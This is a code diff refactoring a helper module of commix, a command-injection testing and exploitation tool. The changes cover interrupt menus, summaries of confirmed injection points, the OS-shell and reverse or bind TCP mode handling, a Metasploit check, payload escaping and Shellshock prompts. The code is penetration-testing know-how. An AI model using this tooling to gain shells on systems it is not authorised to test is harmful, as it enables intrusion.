@@ -26,7 +26,6 @@ import base64
 import importlib
 import gzip
 import zlib
-import traceback
 import subprocess
 import contextlib
 import statistics
@@ -37,16 +36,14 @@ from src.utils import menu
 from src.utils import settings
 from src.thirdparty.odict import OrderedDict
 from src.core.convert import hexdecode
-from socket import error as SocketError
 from src.core.requests import proxy
 from src.core.requests import headers
 from src.core.requests import requests
 from src.core.requests import parameters
 from src.core.requests import stability
-from src.thirdparty.six.moves import input as _input
 from src.thirdparty.six.moves import urllib as _urllib
 from src.thirdparty.six.moves import http_client as _http_client
-from src.thirdparty.colorama import Fore, Back, Style, init
+from src.thirdparty.colorama import Style
 from src.thirdparty.flatten_json.flatten_json import flatten, unflatten_list
 
 try:
@@ -153,7 +150,6 @@ Get response output
 def get_response(output):
   request = _urllib.request.Request(output)
   headers.do_check(request)
-  # Reuse check_http_traffic()'s result instead of sending the request again.
   response = headers.check_http_traffic(request)
   if response is None:
     # Check if defined any HTTP Proxy (--proxy option).
@@ -247,7 +243,6 @@ def custom_injection_marker_character(url, http_request_method):
     _ = settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.DATA = True
   if not _:
     option = "option '--header(s)/--user-agent/--referer/--cookie'"
-  # Values like 'Accept: */*' or ';q=0.9' legitimately contain '*' - don't misread them as a marker.
   def has_marker(value):
     return bool(value) and settings.CUSTOM_INJECTION_MARKER_CHAR in re.sub(settings.PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, "", value)
 
@@ -287,62 +282,8 @@ Logging a debug message when a specific injection technique is being skipped.
 """
 def skipping_technique(technique, injection_type, state):
   if settings.VERBOSITY_LEVEL != 0 and state != True:
-    debug_msg = "Skipping test the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ". "
+    debug_msg = "Skipping test the " + technique_label(injection_type, technique) + ". "
     settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
-
-"""
-Skipping of further tests.
-"""
-def keep_testing_others(filename, url):
-  if not settings.LOAD_SESSION:
-    if settings.SKIP_COMMAND_INJECTIONS:
-      while True:
-        message = "Do you want to keep testing the others? [y/N] "
-        procced_option = common.read_input(message, default="N", check_batch=True)
-        if procced_option in settings.CHOICE_YES:
-          settings.SKIP_COMMAND_INJECTIONS = True
-          return
-        elif procced_option in settings.CHOICE_NO:
-          quit(filename, url, _ = False)
-        elif procced_option in settings.CHOICE_QUIT:
-          raise SystemExit()
-        else:
-          common.invalid_option(procced_option)
-          pass
-
-"""
-Skipping of further command injection tests.
-"""
-def skip_testing(filename, url, announce=""):
-  if not settings.LOAD_SESSION:
-    command_injection_confirmed = not (settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_PHPINFO)
-    if command_injection_confirmed:
-      _ = " further testing"
-    else:
-      _ = " testing command injection techniques"
-    # The parameter is already named in 'announce' right before this - avoid saying it twice.
-    target = "it" if announce else "the " + settings.CHECKING_PARAMETER
-    while True:
-      message = announce + "Do you want to skip" + _ + " on " + target
-      message += "? (recommended if certain) [Y/n] "
-      procced_option = common.read_input(message, default="Y", check_batch=True)
-      if procced_option in settings.CHOICE_YES:
-        settings.SKIP_COMMAND_INJECTIONS = True
-        # "Further testing" must also honor the user's choice for the eval-based engine.
-        if command_injection_confirmed:
-          settings.SKIP_CODE_INJECTIONS = True
-        settings.LOAD_SESSION = False
-        return True
-      elif procced_option in settings.CHOICE_NO:
-        settings.SKIP_COMMAND_INJECTIONS = False
-        if command_injection_confirmed:
-          settings.SKIP_CODE_INJECTIONS = False
-        return False
-      elif procced_option in settings.CHOICE_QUIT:
-        raise SystemExit()
-      else:
-        common.invalid_option(procced_option)
-        pass
 
 """
 Prompt the user to select a mobile User-Agent string.
@@ -379,7 +320,7 @@ def alert():
     try:
       process = subprocess.Popen(menu.options.alert, shell=True)
       process.wait()
-    except Exception as e:
+    except Exception:
       err_msg = "Error occurred while executing command(s) '" + str(menu.options.alert) + "'."
       settings.print_data_to_stdout(settings.print_error_msg(err_msg))
 
@@ -403,14 +344,49 @@ def check_http_method(url):
   return http_request_method
 
 """
-Quit
+True (having said so) when Metasploit isn't installed - every msfvenom-backed payload needs it.
 """
-def quit(filename, url, _):
-  if settings.LOAD_SESSION:
+def metasploit_missing():
+  if os.path.exists(settings.METASPLOIT_PATH):
+    return False
+  settings.print_data_to_stdout(settings.print_error_msg(settings.METASPLOIT_ERROR_MSG))
+  return True
+
+"""
+Suggest '--os-shell', unless it is already in play.
+"""
+def suggest_os_shell():
+  if not menu.options.os_shell:
+    info_msg = "Re-run with the '--os-shell' switch to access a command shell."
+    settings.print_data_to_stdout(settings.print_warning_msg(info_msg))
+
+"""
+Quit - hard_exit ends the process immediately (os._exit), otherwise SystemExit unwinds normally.
+"""
+def quit(filename, url, hard_exit):
+  if settings.CONFIRMED_INJECTION_POINTS:
+    confirmed_injection_points_summary()
+    suggest_os_shell()
+    settings.CONFIRMED_INJECTION_POINTS = []
+  # Post-detection actions run once, after detection finishes.
+  for action_fn in list(settings.PENDING_POST_DETECTION_ACTIONS):
+    action_fn()
+  settings.PENDING_POST_DETECTION_ACTIONS = []
+  # Recurses into quit() when the shell exits; the rest runs there.
+  if settings.PENDING_OS_SHELL_ENTRY:
+    entry = settings.PENDING_OS_SHELL_ENTRY
+    settings.PENDING_OS_SHELL_ENTRY = None
+    entry()
+  # Only ask to delete the output file now, at actual exit.
+  for cleanup_fn in list(settings.PENDING_FILE_CLEANUPS.values()):
+    cleanup_fn()
+  settings.PENDING_FILE_CLEANUPS.clear()
+  if settings.LOAD_SESSION and not settings.LOGS_NOTIFICATION_SHOWN:
+    settings.LOGS_NOTIFICATION_SHOWN = True
     logs.logs_notification(filename)
   logs.print_logs_notification(filename, url)
   common.show_http_error_codes()
-  if _:
+  if hard_exit:
     raise exit()
   else:
     raise SystemExit()
@@ -420,10 +396,17 @@ User aborted procedure
 """
 def user_aborted(filename, url):
   settings.clear_current_line()
+  if os.path.exists(settings.CLI_HISTORY):
+    save_cmd_history()
   abort_msg = "User aborted procedure "
   abort_msg += "during the " + assessment_phase()
   abort_msg += " phase (Ctrl-C pressed)."
   settings.print_data_to_stdout(settings.print_abort_msg(abort_msg))
+  if settings.LOAD_SESSION and not settings.LOGS_NOTIFICATION_SHOWN:
+    settings.LOGS_NOTIFICATION_SHOWN = True
+    logs.logs_notification(filename)
+  logs.print_logs_notification(filename, url)
+  common.show_http_error_codes()
   raise exit()
 
 """
@@ -453,13 +436,12 @@ Ctrl-C during detection - ask how to proceed instead of aborting outright.
 def handle_detection_interrupt(filename, url):
   settings.clear_current_line()
   if settings.MULTI_TARGETS:
-    msg = "How do you want to proceed? [ne(X)t target/(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
-    default = "X"
-    valid_choices = ("x", "s", "e", "n", "v", "q")
+    msg = "How do you want to proceed? [(C)ontinue/ne(X)t target/(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
+    valid_choices = ("c", "x", "s", "e", "n", "v", "q")
   else:
-    msg = "How do you want to proceed? [(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
-    default = "S"
-    valid_choices = ("s", "e", "n", "v", "q")
+    msg = "How do you want to proceed? [(C)ontinue/(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
+    valid_choices = ("c", "s", "e", "n", "v", "q")
+  default = "C"
   choice = "q"
   try:
     while True:
@@ -469,11 +451,11 @@ def handle_detection_interrupt(filename, url):
         break
       common.invalid_option(choice)
   except KeyboardInterrupt:
-    # A second Ctrl-C here means "quit now" - don't let it escape and re-trigger this same prompt one level up.
-    settings.print_data_to_stdout(settings.END_LINE.CR)
+    settings.clear_current_line()
     choice = "q"
-  if choice == "v":
-    # No further prompting - changing verbosity redoes the current technique from the top, not skip past it.
+  if choice == "c":
+    raise settings.RetryTechniqueException()
+  elif choice == "v":
     change_verbosity()
     raise settings.RetryTechniqueException()
   elif choice == "x":
@@ -506,8 +488,7 @@ def handle_early_interrupt(filename, url):
         break
       common.invalid_option(choice)
   except KeyboardInterrupt:
-    # A second Ctrl-C here means "quit now" - don't let it escape and re-trigger this same prompt one level up.
-    settings.print_data_to_stdout(settings.END_LINE.CR)
+    settings.clear_current_line()
     choice = "q"
   if choice == "v":
     # No further prompting - changing verbosity just continues (next target).
@@ -533,8 +514,7 @@ def handle_exploitation_interrupt(filename, url):
         break
       common.invalid_option(choice)
   except KeyboardInterrupt:
-    # A second Ctrl-C here means "quit now" - don't let it escape and re-trigger this same prompt one level up.
-    settings.print_data_to_stdout(settings.END_LINE.CR)
+    settings.clear_current_line()
     choice = "q"
   if choice == "v":
     # No further prompting - changing verbosity just continues.
@@ -579,7 +559,6 @@ def handle_server_cookies(response):
 
   try:
     set_cookie_header = []
-    # Compare cookie names to avoid duplicate server-set values overriding user input.
     declared_cookies = set(c.split('=')[0].strip() for c in menu.options.cookie.split(settings.COOKIE_PARAM_DELIMITER)) if menu.options.cookie else set()
     added_cookies = set()
     for header, value in response.getheaders():
@@ -651,9 +630,10 @@ def tab_autocompleter():
       readline.parse_and_bind("bind ^I rl_complete")
     else:
       readline.parse_and_bind("tab: complete")
+    readline.set_completer_delims(" \t\n")
     # Tab compliter
     readline.set_completer(menu.tab_completer)
-  except (TypeError, AttributeError) as e:
+  except (TypeError, AttributeError):
     error_msg = "Failed to initialize tab completion with the platform's readline library."
     settings.print_data_to_stdout(settings.print_error_msg(error_msg))
 
@@ -662,25 +642,26 @@ Load commands from history.
 """
 def load_cmd_history():
   try:
-    cli_history = os.path.join(os.path.expanduser("~"), settings.CLI_HISTORY)
+    cli_history = settings.CLI_HISTORY
     if os.path.exists(cli_history):
       readline.read_history_file(cli_history)
-  except (IOError, AttributeError, UnicodeError) as e:
-    warn_msg = "There was a problem loading the history file '" + cli_history + "'."
-    if settings.IS_WINDOWS:
-      warn_msg += " See 'https://github.com/pyreadline/pyreadline/issues/30' for more info."
-    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+  except (IOError, AttributeError, UnicodeError):
+    if settings.VERBOSITY_LEVEL != 0:
+      warn_msg = "There was a problem loading the history file '" + cli_history + "'."
+      if settings.IS_WINDOWS:
+        warn_msg += " See 'https://github.com/pyreadline/pyreadline/issues/30' for more info."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 """
 Save command history.
 """
 def save_cmd_history():
   try:
-    cli_history = os.path.join(os.path.expanduser("~"), settings.CLI_HISTORY)
+    cli_history = settings.CLI_HISTORY
     if os.path.exists(cli_history):
       readline.set_history_length(settings.MAX_HISTORY_LENGTH)
       readline.write_history_file(cli_history)
-  except (IOError, AttributeError) as e:
+  except (IOError, AttributeError):
     warn_msg = "Unable to write the history file '" + cli_history + "'."
     settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
@@ -691,63 +672,41 @@ def testing_technique_title(injection_type, technique):
   # A new technique's title - the completion label below is free to print again for it.
   settings.LAST_COMPLETED_TECHNIQUE = None
   settings.LAST_DOT_BUCKET = -1
+  technique = technique_label(injection_type, technique)
+  announced = (settings.CHECKING_PARAMETER, technique)
+  title = "Continuing with the " if settings.LAST_ANNOUNCED_TECHNIQUE == announced else "Testing the "
+  settings.LAST_ANNOUNCED_TECHNIQUE = announced
   if settings.VERBOSITY_LEVEL != 0:
-    info_msg = "Testing the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ". "
+    info_msg = title + technique + ". "
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
   else:
     # Close a previous technique's dangling "... (done)" line first.
     settings.clear_current_line()
-    info_msg = "Testing the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ", please wait..."
+    info_msg = title + technique + ", please wait..."
     settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
 
 """
-Injection process (percent) - a "." per attempt instead of a live percentage, except for
-the terminal markers (all-tested-no-result / already-found), which still replace the line.
+Injection progress - a "." as testing advances, " (done)" once the technique is finished.
 """
-def injection_process(injection_type, technique, percent):
-  if settings.VERBOSITY_LEVEL == 0:
-    # Ensure the progress label is shown before appending the prompt result.
-    if not settings.PROGRESS_LINE_OPEN:
-      testing_technique_title(injection_type, technique)
-    if "%" in str(percent):
-      # One dot per combination can get unreadably long - only cross a 4%-wide bucket.
-      match = re.search(r"([\d.]+)%", str(percent))
-      if match:
-        bucket = int(float(match.group(1)) // 4)
-        if bucket == settings.LAST_DOT_BUCKET:
-          return
-        settings.LAST_DOT_BUCKET = bucket
-      settings.print_data_to_stdout(".")
-      return
+def injection_process(injection_type, technique, done=False, i=None, total=None):
+  if settings.VERBOSITY_LEVEL != 0:
+    return
+  if not settings.PROGRESS_LINE_OPEN:
+    testing_technique_title(injection_type, technique)
+  if done:
     # Can be hit once per false-positive retry on the same technique - only print once.
     if settings.LAST_COMPLETED_TECHNIQUE == technique:
       return
     settings.LAST_COMPLETED_TECHNIQUE = technique
     settings.print_data_to_stdout(" (done)")
-    
-
-"""
-Percentage calculation
-"""
-def percentage_calculation(i, total):
-  percent = ((i*100)/total)
-  float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
-  return percent, float_percent
-
-"""
-Print percentage calculation
-"""
-def print_percentage(float_percent, no_result, shell):
-  if float(float_percent) == 100:
-    if no_result:
-      percent = settings.FAIL_STATUS
-    else:
-      percent = ".. (" + str(float_percent) + "%)"
-  elif shell:
-    percent = settings.info_msg
-  else:
-    percent = ".. (" + str(float_percent) + "%)"
-  return percent
+    return
+  # One dot per combination can get unreadably long - only cross a 4%-wide bucket.
+  if total:
+    bucket = int(((i * 100) / total) // 4)
+    if bucket == settings.LAST_DOT_BUCKET:
+      return
+    settings.LAST_DOT_BUCKET = bucket
+  settings.print_data_to_stdout(".")
 
 """
 Check value inside boundaries.
@@ -766,7 +725,6 @@ def value_inside_boundaries(parameter, http_request_method):
             modifier_check = common.read_input(message, default="Y", check_batch=True)
             if modifier_check in settings.CHOICE_YES:
               parameter = parameter.replace(value_inside_boundaries, pcre_mod_value)
-              # Keep the marker in sync so the prompt reflects the updated value with '/e'.
               value_inside_boundaries = pcre_mod_value
               break
             elif modifier_check in settings.CHOICE_NO:
@@ -794,7 +752,7 @@ def value_inside_boundaries(parameter, http_request_method):
             else:
               common.invalid_option(procced_option)
               pass
-  except Exception as e:
+  except Exception:
     pass
 
   return parameter
@@ -863,6 +821,10 @@ def process_page_content(response, action):
 
   # Handle compressed content
   content_encoding = response.info().get('Content-Encoding')
+  try:
+    response.close()
+  except Exception:
+    pass
   if content_encoding in ("gzip", "x-gzip", "deflate"):
     try:
       if content_encoding == 'deflate':
@@ -871,7 +833,7 @@ def process_page_content(response, action):
       else:  # gzip / x-gzip
         with contextlib.closing(gzip.GzipFile(fileobj=io.BytesIO(page), mode='rb')) as gz:
           page = gz.read()
-    except (zlib.error, OSError, EOFError) as e:
+    except (zlib.error, OSError, EOFError):
       # Only catch relevant decompression errors
       warn_msg = "Page decompression failed, turning off page compression."
       settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
@@ -892,7 +854,7 @@ def process_page_content(response, action):
 
   # If there was an error, advise the user
   if error_occurred:
-    err_msg += "Rerun with"
+    err_msg += "Re-run with"
     if menu.options.codec is None:
       err_msg += "out"
     err_msg += " option '--codec'."
@@ -994,15 +956,7 @@ def unexploitable_point(retry_attempt=None, retry_total=None):
     settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
   warn_msg = "Detected a false positive or unexploitable injection point. Trying for re-verification"
   warn_msg += (" (" + str(retry_attempt) + "/" + str(retry_total) + ").") if retry_attempt else "."
-  settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
-
-"""
-Counting the total of HTTP(S) requests for the identified injection point(s), during the detection phase.
-"""
-def total_of_requests():
-  debug_msg = "Identified the following injection point with "
-  debug_msg += "a total of " + str(settings.TOTAL_OF_REQUESTS) + " HTTP(S) requests."
-  settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 """
 Url decode specific chars of the provided payload.
@@ -1031,26 +985,6 @@ def assessment_phase():
     return "exploitation"
 
 """
-Procced to the next attack vector.
-"""
-def next_attack_vector(technique, go_back, announce=""):
-  if not settings.LOAD_SESSION:
-    while True:
-      message = announce + "Do you want to continue testing using the " + technique + "? [y/N] "
-      next_attack_vector = common.read_input(message, default="N", check_batch=True)
-      if next_attack_vector in settings.CHOICE_YES:
-        # Check injection state
-        assessment_phase()
-        return True
-      elif next_attack_vector in settings.CHOICE_NO:
-        return  False
-      elif next_attack_vector in settings.CHOICE_QUIT:
-        raise SystemExit()
-      else:
-        common.invalid_option(next_attack_vector)
-        pass
-
-"""
 Fix single / double quote escaping.
 """
 def escaped_cmd(cmd):
@@ -1061,6 +995,21 @@ def escaped_cmd(cmd):
   if r"\$" in cmd :
     cmd = cmd.replace(r"\$","$")
   return cmd
+
+"""
+Escape only the "$" sitting outside single quotes - single-quoted interpreter code (php -r '...', perl -e '...') is
+already literal in both a shell and PHP, so a backslash there reaches the interpreter as a syntax error instead.
+"""
+def escape_unquoted_dollars(payload):
+  escaped = []
+  inside_single_quotes = False
+  for char in payload:
+    if char == "'":
+      inside_single_quotes = not inside_single_quotes
+    if char == "$" and not inside_single_quotes:
+      escaped.append("\\")
+    escaped.append(char)
+  return "".join(escaped)
 
 """
 Removing the first and/or last line of the html content (in case there are/is empty).
@@ -1086,24 +1035,110 @@ def vulnerable_message(url):
   if settings.LOAD_SESSION:
     message += " injection point from stored session"
   else:
-    message += " is likely vulnerable"
+    message += " is vulnerable"
   message += "."
   if settings.CRAWLING:
     settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)
   return message
 
 """
+Ask to keep testing others after a confirmed finding - True means stop (quit/break).
+"""
+def prompt_keep_testing(url):
+  message = vulnerable_message(url) + " Do you want to keep testing the others (if any)? [y/N] "
+  procced_option = common.read_input(message, default="N", check_batch=True)
+  return procced_option in settings.CHOICE_NO
+
+"""
+Reduce a technique name to its bare name for the summary block's "Technique:" line -
+drops the "command injection"/"injection" filler word and the trailing "technique" word.
+"""
+def summary_technique_label(technique):
+  technique = short_technique_label(technique)
+  if technique.endswith(" technique"):
+    technique = technique[:-len(" technique")]
+  return technique[0].upper() + technique[1:]
+
+"""
+Name the boundary combination a finding was confirmed with - logged, not printed.
+"""
+def finding_title(separator, whitespace, prefix, suffix):
+  parts = []
+  if separator:
+    parts.append("'" + separator + "' separator")
+  if whitespace:
+    parts.append("'" + whitespace + "' whitespace")
+  if prefix:
+    parts.append("prefix '" + prefix + "'")
+  if suffix:
+    parts.append("suffix '" + suffix + "'")
+  return ", ".join(parts)
+
+"""
+The detail lines of a summary block - shared by the console summary and the log file.
+"""
+def finding_summary_lines(technique, injection_type, payload, title=None):
+  lines = ["  " + settings.SUB_CONTENT_SIGN_TYPE + "Technique: " + summary_technique_label(technique),
+           "  " + settings.SUB_CONTENT_SIGN_TYPE + "Type: " + injection_type[0].upper() + injection_type[1:]]
+  if title:
+    lines.append("  " + settings.SUB_CONTENT_SIGN_TYPE + "Boundary: " + title)
+  lines.append("  " + settings.SUB_CONTENT_SIGN_TYPE + "Payload: " + payload)
+  return lines
+
+"""
+The parameter header line of a summary block.
+"""
+def finding_parameter_line(vuln_parameter, http_request_method):
+  return settings.SUB_CONTENT_SIGN + "'" + vuln_parameter + "' (" + http_request_method + "):"
+
+"""
+Print one block per row, grouped by parameter - rows start with
+(technique, injection_type, vuln_parameter, payload, http_request_method).
+"""
+def _injection_points_summary(header_msg, rows, decode_payload=False):
+  settings.print_data_to_stdout(Style.BRIGHT + header_msg + Style.RESET_ALL)
+  prev_parameter = None
+  for index, row in enumerate(rows):
+    if index > 0:
+      settings.print_data_to_stdout("")
+    technique, injection_type, vuln_parameter, payload, http_request_method = row[:5]
+    current_parameter = (vuln_parameter, http_request_method)
+    if current_parameter != prev_parameter:
+      settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "'"  + Style.BRIGHT + vuln_parameter + Style.RESET_ALL + "' (" + http_request_method + "):")
+      prev_parameter = current_parameter
+    if decode_payload:
+      payload = str(url_decode(payload))
+    for line in finding_summary_lines(technique, injection_type, payload):
+      settings.print_data_to_stdout(line)
+
+"""
+Print a summary of the injection points restored from a stored session.
+"""
+def resumed_injection_points_summary(rows):
+  # Stored payloads are url-encoded, unlike the ones held in memory this run.
+  _injection_points_summary("Resumed the following injection point(s) from stored session:", rows, decode_payload=True)
+
+"""
+Print a summary of every injection point confirmed this run, deferred until quit() (one block per technique).
+"""
+def confirmed_injection_points_summary():
+  rows = settings.CONFIRMED_INJECTION_POINTS
+  if len(rows) == 1:
+    header_msg = "Identified the following injection point with a total of " + str(rows[0][5]) + " HTTP(s) requests:"
+  else:
+    header_msg = "Identified the following injection point(s):"
+  _injection_points_summary(header_msg, rows)
+
+"""
 Check 'os_shell' options
 """
-def check_os_shell_options(cmd, technique, go_back, no_result):
-  if cmd in settings.SHELL_OPTIONS:
+def check_os_shell_options(cmd, filename, url):
+  if cmd in settings.SHELL_OPTIONS or cmd.split(" ", 1)[0] == "use":
     if cmd == "?":
       menu.os_shell_options()
     elif cmd == "back":
-      if next_attack_vector(technique, go_back) == True:
-        return True
-      else:
-        return False
+      # Shell opens only after detection - nothing to go back to.
+      quit(filename, url, hard_exit=True)
     else:
       return cmd
 
@@ -1128,29 +1163,16 @@ def procced_with_file_based_technique():
       pass
 
 """
-Check 'reverse_tcp' options
+Map a TCP mode's returned option to an action: 0 stay, 1 back, 2 os_shell, 3 the other mode.
 """
-def check_reverse_tcp_options(reverse_tcp_option):
-  if reverse_tcp_option == False:
+def check_tcp_mode_result(option, other_mode):
+  if option == False:
     return 0
-  elif reverse_tcp_option == "back":
+  elif option == "back":
     return 1
-  elif reverse_tcp_option == "os_shell":
+  elif option == "os_shell":
     return 2
-  elif reverse_tcp_option == "bind_tcp":
-    return 3
-
-"""
-Check 'bind_tcp' options
-"""
-def check_bind_tcp_options(bind_tcp_option):
-  if bind_tcp_option == False:
-    return 0
-  elif bind_tcp_option == "back":
-    return 1
-  elif bind_tcp_option == "os_shell":
-    return 2
-  elif bind_tcp_option == "reverse_tcp":
+  elif option == other_mode:
     return 3
 
 """
@@ -1262,12 +1284,19 @@ def check_CGI_scripts(url):
   _ = False
   for cgi_script in CGI_SCRIPTS:
     if cgi_script in url:
+      from src.utils import session_handler
+      if session_handler.has_stored_shellshock(url):
+        # Already confirmed - the resumed summary says so.
+        menu.options.shellshock = True
+        return
+
       info_msg = "Heuristic (basic) test shows that target URL might be vulnerable to Shellshock "
       info_msg += "(detected script: '" + cgi_script + "')."
       _ = True
       settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+
       while True:
-        message = "Do you want to enable the Shellshock module ('--shellshock')? [Y/n] "
+        message = "Do you want to test for the Shellshock vulnerability, using the '--shellshock' module? [Y/n] "
         shellshock_check = common.read_input(message, default="Y", check_batch=True)
         if shellshock_check in settings.CHOICE_YES:
           menu.options.shellshock = True
@@ -1293,7 +1322,7 @@ Safely parse a target URL into components.
 def check_url(url):
   try:
     return _urllib.parse.urlsplit(url)
-  except ValueError as ex:
+  except ValueError:
     err_msg = "Invalid target URL provided. "
     err_msg += "Please ensure there are no leftover characters (e.g., '[' or ']') "
     err_msg += "in the hostname part."
@@ -1354,7 +1383,7 @@ def check_connection(url):
         if not settings.MULTI_TARGETS:
           settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
           raise SystemExit()
-      except (socket.error, UnicodeError) as e:
+      except (socket.error, UnicodeError):
         err_msg = "Problem occurred while "
         err_msg += "resolving the hostname '" + hostname + "'"
         if not settings.MULTI_TARGETS:
@@ -1495,10 +1524,28 @@ def EOFError_err_msg():
   settings.print_data_to_stdout(settings.print_error_msg(err_msg))
 
 """
+Ask whether to ignore an already-completed action's stored session and redo it.
+"""
+def ask_redo_stored_session(verb, redo_action):
+  while True:
+    message = "Do you want to ignore stored session and " + verb + " again? [y/N] "
+    again = common.read_input(message, default="N", check_batch=True)
+    if again in settings.CHOICE_YES:
+      if not menu.options.ignore_session:
+        menu.options.ignore_session = True
+      redo_action()
+      return
+    elif again in settings.CHOICE_NO:
+      return
+    elif again in settings.CHOICE_QUIT:
+      raise SystemExit()
+    else:
+      common.invalid_option(again)
+
+"""
 Message regarding unexpected time delays due to unstable requests
 """
 def time_delay_due_to_unstable_request(timesec):
-  # Already answered this run - reapply it instead of asking again.
   if settings.UNSTABLE_REQUEST_CHOICE:
     if settings.UNSTABLE_REQUEST_CHOICE == "c" and settings.UNSTABLE_REQUEST_BUMPS < settings.MAX_UNSTABLE_TIMESEC_BUMP:
       timesec = timesec + 1
@@ -1531,7 +1578,7 @@ def time_delay_due_to_unstable_request(timesec):
 True only for a genuinely finished stored value - a partial (interrupted-run) marker isn't a result yet, and must be treated the same as "nothing stored" so the caller re-runs (and thereby resumes) it instead of handing back the raw marker.
 """
 def usable_stored_cmd(stored_value):
-  return stored_value is not None and not stored_value.startswith(settings.PARTIAL_VALUE_MARKER)
+  return bool(stored_value) and not stored_value.startswith(settings.PARTIAL_VALUE_MARKER)
 
 """
 Drop high-latency spikes from a response-time sample via a median/MAD cutoff.
@@ -1562,9 +1609,9 @@ Blocking warm-up: fills the response-time model to MIN_TIME_RESPONSES before the
 def warm_up_response_baseline(url, http_request_method):
   if len(settings.RESPONSE_TIMES) >= settings.MIN_TIME_RESPONSES:
     return
-  info_msg = "Time-related response comparison requires a larger statistical model"
-  info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
-  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
+  warn_msg = "Time-related response comparison requires a larger statistical model"
+  warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
+  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
   while len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
     sample = requests.quick_response_time_sample(url, http_request_method)
     if sample is not None:
@@ -1574,6 +1621,7 @@ def warm_up_response_baseline(url, http_request_method):
   if settings.VERBOSITY_LEVEL == 0:
     settings.print_data_to_stdout(" (done)")
     settings.close_progress_line()
+  check_lagging()
 
 """
 Warns once (whichever call site reaches it first) if the connection is already too jittery to trust automatically, and disables timesec auto-shrinking for the rest of the run. Returns True if lagging is (or was already found to be) detected.
@@ -1598,19 +1646,19 @@ def current_delay_threshold():
   deviation = statistics.pstdev(sample)
   if not deviation:
     return None
-  if len(sample) < settings.MIN_TIME_RESPONSES and settings.VERBOSITY_LEVEL != 0:
-    debug_msg = "Time-based standard deviation method used on a model with less than " + str(settings.MIN_TIME_RESPONSES) + " response times."
-    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
-  return max(settings.MIN_VALID_DELAYED_RESPONSE, statistics.mean(sample) + settings.TIME_STDEV_COEFF * deviation)
+  mean = statistics.mean(sample)
+  margin = max(settings.TIME_STDEV_COEFF * deviation, mean * settings.MIN_RELATIVE_DELAY_MARGIN)
+  return max(settings.MIN_VALID_DELAYED_RESPONSE, mean + margin)
 
 """
 Time related shell condition. Uses the adaptive threshold once available, else a fixed one.
 """
 def time_related_shell(url_time_response, exec_time, timesec):
+  if settings.BASELINE_TARGET:
+    warm_up_response_baseline(*settings.BASELINE_TARGET)
   lower_limit = current_delay_threshold()
   delayed = exec_time >= lower_limit if lower_limit is not None else exec_time >= timesec
 
-  # Prompt once on the first delayed exploitation response; use the same gate for delay adjustments.
   if delayed and settings.EXPLOITATION_PHASE and settings.ADJUST_TIME_DELAY_CHOICE is None:
     msg = "Do you want commix to try to optimize the value(s) for delay responses (option '--time-sec')? [Y/n] "
     settings.ADJUST_TIME_DELAY_CHOICE = common.read_input(msg, default="Y", check_batch=True) in settings.CHOICE_YES
@@ -1630,7 +1678,7 @@ def time_related_attaks_msg():
 Check if defined "--url-reload" option.
 """
 def reload_url_msg(technique):
-  warn_msg = "On the " + technique + " technique, the '--url-reload' option is not available."
+  warn_msg = "On the " + short_technique_label(technique) + ", the '--url-reload' option is not available."
   settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 """
@@ -1681,75 +1729,58 @@ def enable_all_enumeration_options():
   menu.options.passwords = True
 
 """
-Check provided parameters for tests
+Parse -p/--skip into their own lists.
 """
 def check_provided_parameters():
 
-  if menu.options.test_parameter or menu.options.skip_parameter:
-    if menu.options.test_parameter != None :
-      if menu.options.test_parameter.startswith("="):
-        menu.options.test_parameter = menu.options.test_parameter[1:]
-      settings.TESTABLE_PARAMETERS_LIST = menu.options.test_parameter.split(settings.PARAMETER_SPLITTING_REGEX)
+  def parse_parameter_list(raw):
+    if raw.startswith("="):
+      raw = raw[1:]
+    parsed = raw.split(settings.PARAMETER_SPLITTING_REGEX)
+    return [p.split("=")[0] if "=" in p else p for p in parsed]
 
-    elif menu.options.skip_parameter != None :
-      if menu.options.skip_parameter.startswith("="):
-        menu.options.skip_parameter = menu.options.skip_parameter[1:]
-      settings.TESTABLE_PARAMETERS_LIST = menu.options.skip_parameter.split(settings.PARAMETER_SPLITTING_REGEX)
+  if menu.options.test_parameter:
+    settings.TESTABLE_PARAMETERS_LIST = parse_parameter_list(menu.options.test_parameter)
 
-    for i in range(0,len(settings.TESTABLE_PARAMETERS_LIST)):
-      if "=" in settings.TESTABLE_PARAMETERS_LIST[i]:
-        settings.TESTABLE_PARAMETERS_LIST[i] = settings.TESTABLE_PARAMETERS_LIST[i].split("=")[0]
+  if menu.options.skip_parameter:
